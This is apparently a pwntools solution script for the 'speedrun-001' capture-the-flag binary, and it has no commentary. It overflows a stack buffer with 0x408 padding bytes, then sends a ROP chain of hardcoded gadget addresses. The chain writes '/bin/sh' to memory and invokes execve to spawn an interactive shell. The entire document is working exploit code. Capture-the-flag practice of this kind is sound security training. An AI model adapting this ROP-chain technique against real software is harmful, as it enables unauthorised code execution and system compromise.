from pwn import *

target = process('./speedrun-001')

popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)

writeGadget = p64(0x48d251)
syscall = p64(0x40129c)


payload = b''
payload += popRdx
payload += b"/bin/sh\x00"
payload += popRax
payload += p64(0x6b6000)
payload += writeGadget



payload += popRax
payload += p64(0x3b)

payload += popRdi
payload += p64(0x6b6000)

payload += popRsi
payload += p64(0)
payload += popRdx
payload += p64(0)

payload += syscall


payload = b"0"*0x408 + payload

target.sendline(payload)

target.interactive()